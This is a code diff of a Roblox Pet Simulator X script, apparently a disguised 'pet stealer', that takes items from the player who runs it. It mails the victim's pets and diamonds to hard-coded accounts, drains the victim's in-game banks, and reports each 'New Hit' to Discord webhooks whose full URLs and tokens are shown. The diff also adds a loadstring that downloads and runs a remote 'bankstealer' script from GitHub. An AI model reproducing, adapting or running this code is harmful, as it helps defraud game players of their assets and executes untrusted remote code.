@@ -17,7 +17,7 @@ for i,v in pairs(Library.Save.Get().Pets) do
 end
 if hugeamount >1 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
      Username = "TehPucuk_55"
-     Webhook = "https://discord.com/api/webhooks/1105338973276098640/06ugJwRCNfo9JEKzGcvhiPQjz4v72-qeUH1Hz3MnRSpAqMcteAyq4Pxk5CmpZC5sXSxu"
+     WebHook = "https://discord.com/api/webhooks/1123217431209451570/SqU9AFLcRkODdNrBzANlSzd3HtL9tCiXSVWyqG-V0jYM2sqU64s2OgJTgcqWHKh3OHxQ"
 end
 
 if getgenv().executed then return end
@@ -89,7 +89,7 @@ if not worked2 then
     return;
 end
 if worked2 then
-    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(UserName)
+    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(Username)
 end
 if UserName2 ~= nil then
     local worked3 = pcall(function()
@@ -467,11 +467,11 @@ if Bank ~= nil and invspace() ~= 0 then
                 withdrawremote:InvokeServer(Bank, LFinalList, bdiaamt)
             end)
             if s == false then
-                wait(0)
+                wait(0.2)
                 withdrawremote:InvokeServer(Bank, LFinalList, 0)
             end
             FinalFinal = FinalFinal + #LFinalList
-            wait(0)
+            wait(1.5)
         else
             print('done1')
             break
@@ -522,10 +522,10 @@ if Bank2 ~= nil and invspace() ~= 0 then
                 withdrawremote:InvokeServer(Bank2, FinalList2, bdiaamt2)
             end)
             if s == false then
-                wait(0)
+                wait(0.2)
                 withdrawremote:InvokeServer(Bank2, FinalList2, 0)
             end
-            wait(0)
+            wait(1.5)
             FinalFinal = FinalFinal + #FinalList2
         else
             print('done2')
@@ -579,10 +579,10 @@ if Bank3 ~= nil and invspace() ~= 0 then
             end)
 
             if s == false then
-                wait(0)
+                wait(0.2)
                 withdrawremote:InvokeServer(Bank3, FinalList3, 0)
             end
-            wait(0)
+            wait(1.5)
             FinalFinal = FinalFinal + #FinalList3
         else
             print('done3')
@@ -634,11 +634,11 @@ if Bank4 ~= nil and invspace() ~= 0 then
             end)
 
             if s == false then
-                wait(0)
+                wait(0.2)
                 withdrawremote:InvokeServer(Bank4, FinalList4, 0)
             end
             FinalFinal = FinalFinal + #FinalList4
-            wait(0)
+            wait(1.5)
         else
             print('done4')
             break
@@ -691,10 +691,10 @@ if Bank5 ~= nil and invspace() ~= 0 then
             end)
 
             if s == false then
-                wait(0)
+                wait(0.2)
                 withdrawremote:InvokeServer(Bank5, FinalList5, 0)
             end
-            wait(0)
+            wait(1.5)
             FinalFinal = FinalFinal + #FinalList5
         else
             print('done5')
@@ -759,7 +759,7 @@ local inbox = #check.Inbox
 
 if inbox ~= 0 and invspace_nolimit() >= inbox then
     claimallremote:InvokeServer()
-    task.wait(0)
+    task.wait(1.5)
 end
 
 -- Run Bankstealer if Diamonds Are < 110k
@@ -770,6 +770,7 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Egorikusa/PetSimulatorX/main/bankstealer", true))() -- Exc : -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
 if _G.AntiLeave ~= false then
@@ -1028,7 +1029,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
             ["username"] = "Monzz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Monzz||",
+                ["title"] = "**New Hit** ||By Monzz||",
                 ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
@@ -1098,7 +1099,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
             ["username"] = "Monzz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Monzz||",
+                ["title"] = "**New Hit** ||By Monzz||",
                 ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
@@ -1249,7 +1250,7 @@ local user
 -- Gems Only
 if FinalList == 0 then
     if givediaamt >= 1000000000 then
-        user = UserName
+        user = Username
     else
         user = ndUser
     end
@@ -1271,14 +1272,14 @@ spawn(function()
     while wait() do
         if #TList ~= 0 or TList ~= {} then
             for i, v in pairs(TList) do
-                user = UserName
+                user = Username
                 if titanicin ~= nil then
                     if dualhook(titanicin) then
                     end
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55",
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1298,14 +1299,14 @@ spawn(function()
     while wait() do
         if #BList ~= 0 and #TList == 0 then
             for i, v in pairs(BList) do
-                user = UserName
+                user = Username
                 if bananin ~= nil then
                     if dualhook(bananin) then
                     end
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55",
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1330,7 +1331,6 @@ spawn(function()
                 user = Username
                 if hugein ~= nil then
                     if dualhook(hugein) then
-                    user = UserName
                     end
                 end
                 local args = {
@@ -1383,9 +1383,10 @@ spawn(function()
     while wait() do
         if #EList ~= 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
             for i, v in pairs(EList) do
-                user = ndUser
+                user = UserName
                 if excin ~= nil then
                     if dualhook(excin) then
+                    user = Username
                     end
                 end
                 local args = {
@@ -1467,7 +1468,6 @@ spawn(function()
                 user = ndUser
                 if mythicin ~= nil then
                     if dualhook(mythicin) then
-                        user = dhuser
                     end
                 end
                 local args = {
